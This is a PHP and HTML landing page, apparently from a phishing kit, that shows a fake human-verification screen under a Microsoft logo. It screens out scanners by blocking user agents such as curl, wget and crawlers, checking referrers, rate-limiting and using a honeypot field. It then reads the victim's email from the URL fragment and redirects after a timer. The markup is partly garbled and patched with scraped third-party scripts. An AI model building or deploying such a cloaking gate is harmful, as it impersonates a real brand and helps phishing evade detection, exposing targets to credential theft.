<?php
session_start(); // Start the session

$ip = $_SERVER['REMOTE_ADDR'];
$rate_limit = 20; // Maximum number of requests allowed
$time_window = 60 * 60; // Time window in seconds (1 hour);

// Initialize session requests array if not already set
if (!isset($_SESSION['requests'])) {
    $_SESSION['requests'] = array();
}

$requests = &$_SESSION['requests'];
$now = time();

// Clean up old entries from the session
foreach ($requests as $ip_address => $data) {
    if ($data['last_request'] + $time_window < $now) {
        unset($requests[$ip_address]);
    }
}

// Honeypot field check to catch bots (renamed the field)
if (!empty($_POST['hidden_address_field'])) {
    // Honeypot filled indicates bot
    http_response_code(403);
    echo json_encode(["status" => "fail", "reason" => "bot_detected"]);
    exit();
}


// Mouse movement check
if (isset($_POST['mouse_movement'])) {
    $mouse_movement = $_POST['mouse_movement'];
    // Process the mouse movement data here
} else {
    // Handle the case where mouse movement data is not sent
    $mouse_movement = null; // Or take appropriate action
}


// User-Agent check
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$suspicious_agents = ['bot', 'crawl', 'spider', 'curl', 'wget'];

foreach ($suspicious_agents as $agent) {
    if (stripos($user_agent, $agent) !== false) {
        http_response_code(403); // Forbidden
        echo json_encode(["status" => "fail", "reason" => "bot_user_agent_detected"]);
        exit();
    }
}

// Referrer check (only block if it's suspicious, not missing)
$referrer = $_SERVER['HTTP_REFERER'] ?? '';
if (!empty($referrer)) {
    // Block suspicious referrers (optional: add your own conditions)
    $allowed_domains = ['yourdomain.com']; // Add valid domains
    $is_valid_referrer = false;

    foreach ($allowed_domains as $domain) {
        if (stripos($referrer, $domain) !== false) {
            $is_valid_referrer = true;
            break;
        }
    }

    if (!$is_valid_referrer) {
        http_response_code(403); // Forbidden
        echo json_encode(["status" => "fail", "reason" => "invalid_referrer"]);
        exit();
    }
}

// Rate limiting check
if (isset($requests[$ip])) {
    $requests[$ip]['count']++;
    $requests[$ip]['last_request'] = $now;

    // If request count exceeds the rate limit, deny access
    if ($requests[$ip]['count'] > $rate_limit) {
        http_response_code(429); // Too Many Requests
        echo json_encode(["status" => "lost", "message" => "i think you are lost"]);
        exit();
    }
} else {
    // Add new IP address to session tracking
    $requests[$ip] = array('count' => 1, 'last_request' => $now);
}

// If everything is okay, proceed to render the landing page
?>

<!DOCTYPE html>
<html>
<head>
    <title>Your Landing Page</title>
    <!-- CSS to hide the honeypot field -->
    <style>
        .ant-bot {
            display: none; /* Honeypot field hidden from real users */
            position: absolute;
            left: -9999px;
        }
        .container {
            text-align: center;
            margin: 50px auto;
        }
        h2 {
            font-size: 2em;
        }
        p {
            font-size: 1.2em;
        }
    </style>

    <!-- JavaScript for mouse movement detection -->
    <script>
        window.onload = function() {
            // Mouse movement tracking to detect bots
            let hasMovedMouse = false;
            window.addEventListener('mousemove', function() {
                hasMovedMouse = true;
            });

            // Form submission handler
            document.querySelector('form').onsubmit = function(event) {
                // Check if mouse movement was detected
                if (!hasMovedMouse) {
                    document.getElementById('mouse-movement').value = 'bot';
                } else {
                    document.getElementById('mouse-movement').value = 'human';
                }
            };
        };
    </script>
</head>
<body>
   <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: rgba(0,0,0,0.55);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            background: #ffffff;
            filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr='#8C000000', endColorstr='#8C000000');
            background-size: cover;
        }
        .background-overlay {
    background: rgba(0,0,0,0.55);
    filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0, startColorstr='#8C000000', endColorstr='#8C000000');
    position: absolute;
    top: 0;
    width: 100%;
    height: 100%
}

        .header {
            width: 100%;
            background-color: #0078d4;
            color: white;
            text-align: left;
            padding: 10px 20px;
            box-sizing: border-box;
            font-size: 18px;
            position: absolute;
            top: 0;
        }

        .header span {
            margin-left: 20px;
        }

        .container {
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 3px;
            padding: 33px;
            width: 100%;
            max-width: 300px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            margin-top: 0px;
        }

        .container img {
            width: 100px;
            margin-bottom: 20px;
        }

        .container h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        .container p {
            margin-bottom: 10px;
            color: #666;

        }

        .container p2 {
            margin-bottom: 10px;
            color: #666;
            font-size: 13px;
            margin-bottom: 20px
        }

        .container input[type="email"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            box-sizing: border-box;
            text-align: center;
        }

        .container button {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
        }

        .container button:hover {
            background-color: #005a9e;
        }

        .container .footer {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }

            .container h2 {
                font-size: 20px;
            }

            .container .space {
                margin-bottom: 20px;
            
            }

            .container input[type="email"] {
                font-size: 14px;
            }

            .container button {
                font-size: 14px;
            }
        }

        .button {
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        .button.green {
            background-color: green;
        }
        .popup {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 1px solid #ccc;
            padding: 20px;
            background: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            text-align: center;
            z-index: 20;
        }
        .popup button {
            margin-top: 10px;
        }
        .popup .close-btn {
            position: absolute;
            top: 5px;
            right: 10px;
            cursor: pointer;
        }
        .blur {
            filter: blur(5px);
            pointer-events: none;
        }
    </style>
</head>
<body>
         <div class="container" id="container">
        <img src="data:image/png;base64,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" alt="Microsoft Logo" width="100">
        <h2 style="font-size:20px">Let us know you are human</h2>
        <p id="message">Please wait for the timer to expire before you continue.</p>
        <p id="timer">Please wait <span id="seconds">6</span> seconds.</p>
        <button id="continue-button" class="button">Continue</button>
    </div>

    <div class="popup" id="popup">
        <span class="close-btn" id="close-popup">X</span>
        <p>You have to wait for 6 seconds before you can proceed.</p>
        <button id="close-button" class="button">Close</button>
    </div>

    <script>
        // Function to get email from the URL and preserve "@" character
        function getEmailFromUrl() {
            const url = window.location.href;
            const email = url.split('#')[1];
            if (email) {
                return email.split('@').map(encodeURIComponent).join('@');
            }
            return '';
        }

        let seconds = 6;
        const timerElement = document.getElementById('seconds');
        const messageElement = document.getElementById('message');
        const button = document.getElementById('continue-button');
        const popup = document.getElementById('popup');
        const closeButton = document.getElementById('close-button');
        const closePopupButton = document.getElementById('close-popup');
        const container = document.getElementById('container');
        const email = getEmailFromUrl();

        function resetTimer() {
            clearInterval(timerInterval);
            seconds = 5;
            timerElement.textContent = seconds;
            messageElement.textContent = "Please wait for the timer to expire before you continue.";
            timerInterval = setInterval(updateTimer, 1000);
        }

        function updateTimer() {
            seconds--;
            timerElement.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(timerInterval);
                messageElement.textContent = "You can proceed now";
                button.classList.add('blue');
                button.onclick = () => {
                    window.location.href = `https://google.com`;
                };
            }
        }

        let timerInterval = setInterval(updateTimer, 1000);

        button.onclick = () => {
            if (seconds > 0) {
                popup.style.display = 'block';
                container.classList.add('blur');
            }
        };

        closeButton.onclick = closePopupButton.onclick = () => {
            popup.style.display = 'none';
            container.classList.remove('blur');
            resetTimer();
        };
    </script>


<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8b210fd0abda0b59',t:'MTcyMzQ3MTk2MS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><div id="shopify-block-10025992882218306672" class="shopify-block shopify-app-block">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700&display=swap" class="sp-whatsapp-embed"/>
</div></body>

        <!-- Honeypot field to catch bots (hidden from users) -->
        <form method="post">
            <input type="hidden" name="mouse_movement" id="mouse-movement" value="human" />
            <input type="text" name="hidden_address_field" class="ant-bot" /> <!-- Honeypot field -->
            <button type="submit" style="display:none;">Submit</button>
        </form>
        
        
    </div>
	<script>
	window.onload = function() {
    let hasMovedMouse = false;
    let movements = 0;

    // Track mouse movements and events over time
    window.addEventListener('mousemove', function() {
        hasMovedMouse = true;
        movements++;
    });

    window.addEventListener('click', function() {
        movements++;
    });

    // On form submission
    document.querySelector('form').onsubmit = function(event) {
        if (!hasMovedMouse || movements < 5) {
            document.getElementById('mouse-movement').value = 'bot';
        } else {
            document.getElementById('mouse-movement').value = 'human';
        }
    };
};
</script>
	
    <!-- Your visible landing page ends here -->
</body>
</html>
